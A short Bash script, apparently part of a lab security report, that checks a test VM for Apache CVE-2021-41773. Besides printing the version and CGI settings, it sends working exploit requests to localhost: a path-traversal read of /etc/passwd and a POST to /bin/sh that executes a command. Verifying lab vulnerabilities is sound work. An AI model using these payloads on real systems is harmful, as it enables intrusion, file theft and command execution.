#!/usr/bin/env bash
# w3-check.sh — verifica W3 (CVE-2021-41773) en M1: versión, traversal y RCE.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

./informe/tools/vm.sh m1 '
echo "== Apache =="
/usr/local/apache2/bin/httpd -v | head -1
echo "== CGI config =="
grep -A3 "<Directory \"/usr/local/apache2/cgi-bin\">" /usr/local/apache2/conf/httpd.conf | grep -E "Options|Require"
echo "== Traversal =="
curl -s -o /dev/null -w "HTTP %{http_code}\n" --path-as-is "http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
echo "== RCE =="
curl -s --path-as-is -X POST "http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
'
